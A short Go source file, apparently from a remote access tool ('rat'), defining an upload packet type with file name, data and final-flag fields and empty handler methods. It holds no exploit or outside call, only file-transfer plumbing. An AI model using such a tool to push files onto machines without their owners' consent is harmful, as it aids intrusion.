package main

import (
	"rat/common"
)

type UploadPacket struct {
	File  string `network:"send"`
	Final bool   `network:"send"`
	Data  []byte `network:"send"`
}

func (packet UploadPacket) Header() common.PacketHeader {
	return common.PutFileHeader
}

func (packet UploadPacket) Init(c *Client) {

}

func (packet UploadPacket) OnReceive(c *Client) error {
	return nil
}
